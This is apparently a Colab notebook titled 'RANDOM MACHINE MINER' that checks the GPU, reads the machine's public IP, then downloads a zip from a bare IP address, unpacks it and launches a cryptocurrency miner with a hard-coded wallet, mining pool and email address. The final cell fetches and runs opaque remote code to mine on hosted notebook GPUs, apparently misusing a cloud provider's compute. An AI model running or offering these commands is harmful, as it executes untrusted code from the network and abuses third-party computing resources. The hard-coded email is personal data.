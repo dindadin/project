{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "t4.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "tgStBr7qs3bq"
      },
      "source": [
        "# **RANDOM MACHINE MINER**"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "LNka3LN3s74R"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ADtzqJ2JtIjt"
      },
      "source": [
        "!curl ipinfo.io"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "MaJbcXkUtMiz"
      },
      "source": [
        "!wget http://13.229.93.85:81/aria2/dl/nanobaru.zip\n",
        "!unzip nanobaru.zip\n",
        "%cd nanobaru/\n",
        "!chmod +x cmdline_launcher.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./cmdline_launcher.sh -algo octopus -wallet 0x17039d11f044859ef66ce7fadfd64aab8b90a74c -coin cfx -rigName CFX1 -pool1 cfx-us-east1.nanopool.org:17777 -email lput7447@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}